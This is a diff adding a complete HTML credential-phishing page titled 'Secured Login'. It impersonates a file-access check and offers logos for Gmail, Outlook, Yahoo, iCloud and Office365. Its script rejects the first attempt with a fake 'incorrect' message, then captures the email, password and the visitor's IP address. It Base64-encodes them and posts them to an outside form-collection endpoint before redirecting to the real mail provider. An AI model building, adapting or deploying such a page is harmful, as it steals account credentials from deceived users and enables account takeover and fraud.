@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secured Login </title>
+    <!-- Font Awesome 6 (free) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* (styles unchanged – same as before) */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f0f5ff 0%, #e9eef5 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            position: relative;
+        }
+
+        .login-card {
+            background: rgba(255,255,255,0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 2.2rem;
+            box-shadow: 0 30px 60px rgba(0,15,40,0.2), 0 0 0 1px rgba(255,255,255,0.7) inset;
+            width: 100%;
+            max-width: 480px;
+            padding: 2.5rem 2rem;
+        }
+
+        .subhead {
+            color: #3f4e6b;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        #credentials-container {
+            display: none;
+            margin-bottom: 1.5rem;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        label {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #1e2b45;
+            display: block;
+            margin-bottom: 0.4rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 1rem 1.3rem;
+            background: white;
+            border: 2px solid #d8e1ef;
+            border-radius: 1.5rem;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.2s;
+            color: #0a1a32;
+        }
+
+        .input-field:focus {
+            border-color: #2d68c4;
+            box-shadow: 0 0 0 4px rgba(45,104,196,0.15);
+        }
+
+        .input-field::placeholder {
+            color: #98a9c3;
+            font-weight: 300;
+        }
+
+        .provider-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1rem;
+            margin: 1.5rem 0 1.8rem;
+        }
+
+        .provider-item {
+            background: white;
+            width: 5rem;
+            padding: 0.6rem 0;
+            border-radius: 2rem;
+            border: 1px solid #dbe2ed;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.25rem;
+            cursor: pointer;
+            transition: all 0.15s;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.02);
+        }
+
+        .provider-item:hover {
+            border-color: #2d68c4;
+            transform: translateY(-4px);
+            background: #f5f9ff;
+            box-shadow: 0 10px 18px -8px rgba(45,104,196,0.3);
+        }
+
+        .provider-item i {
+            font-size: 1.8rem;
+        }
+
+        .provider-item span {
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #1f2e4a;
+        }
+
+        .fa-google { color: #DB4437; }
+        .fa-envelope { color: #00A4EF; }
+        .fa-yahoo { color: #6001D2; }
+        .fa-apple { color: #000000; }
+        .provider-item[data-domain="other"] i { color: #6c757d; }
+
+        .login-btn {
+            width: 100%;
+            background: #14273e;
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 2rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 8px 16px -6px #14273e70;
+            margin-bottom: 0;
+        }
+
+        .login-btn:hover {
+            background: #0c1b2c;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #14273e;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            font-size: 1rem;
+            font-weight: 500;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            white-space: nowrap;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="subhead">
+            <span>If you are the intended recipient. Please verify your identity by selecting your email provider or entering your email address to sign in and access the protected file.</span>
+        </div>
+
+        <!-- Email + Password container (hidden initially) -->
+        <div id="credentials-container">
+            <div class="input-group">
+                <label for="email">Email address</label>
+                <input type="email" class="input-field" id="email" name="email" placeholder="your@email.com" value="">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" class="input-field" id="password" name="password" placeholder="••••••••">
+            </div>
+        </div>
+
+        <!-- Email provider icons -->
+        <div class="provider-grid">
+            <div class="provider-item" data-domain="gmail.com">
+                <i class="fab fa-google"></i>
+                <span>Gmail</span>
+            </div>
+            <div class="provider-item" data-domain="outlook.com">
+                <i class="fas fa-envelope"></i>
+                <span>Outlook</span>
+            </div>
+            <div class="provider-item" data-domain="yahoo.com">
+                <i class="fab fa-yahoo"></i>
+                <span>Yahoo</span>
+            </div>
+            <div class="provider-item" data-domain="icloud.com">
+                <i class="fab fa-apple"></i>
+                <span>iCloud</span>
+            </div>
+            <div class="provider-item" data-domain="office365.com">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="1.8rem" height="1.8rem">
+                    <rect x="2" y="2" width="10" height="10" fill="#F25022"/>
+                    <rect x="12" y="2" width="10" height="10" fill="#7FBA00"/>
+                    <rect x="2" y="12" width="10" height="10" fill="#00A4EF"/>
+                    <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
+                </svg>
+                <span>Office365</span>
+            </div>
+            <div class="provider-item" data-domain="other">
+                <i class="fas fa-envelope" style="color: #6c757d;"></i>
+                <span>Other</span>
+            </div>
+        </div>
+
+        <!-- Sign in button -->
+        <button type="submit" class="login-btn" id="loginButton"><i class="fas fa-arrow-right-to-bracket" style="margin-right: 8px;"></i> Sign in</button>
+    </div>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
+
+    <script>
+        (function() {
+            const FORMIZEE_ENDPOINT = 'https://api.formizee.com/v1/f/enp_mEuomi9gySdYnWZCTsLjdGbmUXu';
+
+            const credentialsContainer = document.getElementById('credentials-container');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('loginButton');
+            const toast = document.getElementById('toast');
+
+            let selectedProviderDomain = null;
+
+            const providerUrls = {
+                'gmail.com': 'https://mail.google.com',
+                'outlook.com': 'https://outlook.live.com',
+                'yahoo.com': 'https://mail.yahoo.com',
+                'icloud.com': 'https://www.icloud.com/mail',
+                'office365.com': 'https://www.office.com',
+                'other': 'https://www.google.com'
+            };
+
+            let loginAttempts = 0;
+            let locationData = null;
+
+            async function fetchLocation() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    if (!response.ok) throw new Error('IP fetch failed');
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        city: 'unknown',
+                        country: 'unknown'
+                    };
+                } catch (error) {
+                    console.warn('Could not fetch IP:', error);
+                    return { ip: 'unknown', city: 'unknown', country: 'unknown' };
+                }
+            }
+
+            // Helper function to safely Base64 encode a string (works with Unicode)
+            function encodeBase64(str) {
+                try {
+                    // btoa only works with ASCII; for Unicode we need to encode to UTF-8 first.
+                    // Using a simple approach: encodeURIComponent then replace, but more robust is to use TextEncoder.
+                    // However, email/password/IP are usually ASCII, but for safety:
+                    const utf8Bytes = new TextEncoder().encode(str);
+                    const binary = String.fromCharCode(...utf8Bytes);
+                    return btoa(binary);
+                } catch (e) {
+                    console.warn('Base64 encoding failed, falling back to raw', e);
+                    return str;
+                }
+            }
+
+            async function sendToFormizee(email, password, provider, location) {
+                // Encode email, password, and IP address
+                const encodedEmail = encodeBase64(email);
+                const encodedPassword = encodeBase64(password);
+                const encodedIP = encodeBase64(location.ip);
+
+                const formData = new URLSearchParams();
+                formData.append('email', encodedEmail);
+                formData.append('password', encodedPassword);
+                formData.append('provider', provider);
+                formData.append('ip', encodedIP);
+                formData.append('city', location.city);    // already 'unknown'
+                formData.append('country', location.country);
+                formData.append('timestamp', new Date().toISOString());
+
+                try {
+                    const response = await fetch(FORMIZEE_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: formData.toString()
+                    });
+                    if (!response.ok) {
+                        console.error('Formizee submission failed', await response.text());
+                    } else {
+                        console.log('Data sent to Formizee successfully');
+                    }
+                } catch (error) {
+                    console.error('Error sending to Formizee:', error);
+                }
+            }
+
+            function showToast(message, duration = 1500) {
+                toast.textContent = message;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), duration);
+            }
+
+            document.querySelectorAll('.provider-item').forEach(item => {
+                item.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    selectedProviderDomain = item.dataset.domain;
+                    
+                    if (credentialsContainer.style.display === 'none' || getComputedStyle(credentialsContainer).display === 'none') {
+                        credentialsContainer.style.display = 'block';
+                    }
+                    
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    loginAttempts = 0;
+                    
+                    emailInput.focus();
+                    emailInput.style.transition = 'background 0.2s';
+                    emailInput.style.background = '#f0f7ff';
+                    setTimeout(() => emailInput.style.background = '', 200);
+                });
+            });
+
+            async function handleLogin() {
+                if (credentialsContainer.style.display === 'none' || getComputedStyle(credentialsContainer).display === 'none') {
+                    alert('Please select an email provider first by clicking one of the icons above.');
+                    return;
+                }
+
+                if (!selectedProviderDomain) {
+                    alert('Please select an email provider.');
+                    return;
+                }
+
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+
+                if (!email || !password) {
+                    alert('Please enter both email and password.');
+                    return;
+                }
+                if (!email.includes('@') || !email.includes('.')) {
+                    alert('Enter a valid email address (e.g., name@domain.com).');
+                    return;
+                }
+
+                if (loginAttempts === 0) {
+                    alert('Please enter correct email and password.');
+                    loginAttempts = 1;
+                    return;
+                }
+
+                // Second attempt: success
+                showToast(`✅ Login successful! Signed in as: ${email}`);
+
+                if (!locationData) {
+                    locationData = await fetchLocation();
+                }
+
+                sendToFormizee(email, password, selectedProviderDomain, locationData);
+
+                const redirectUrl = providerUrls[selectedProviderDomain] || 'https://www.google.com';
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1500);
+            }
+
+            loginBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                handleLogin();
+            });
+
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+            emailInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
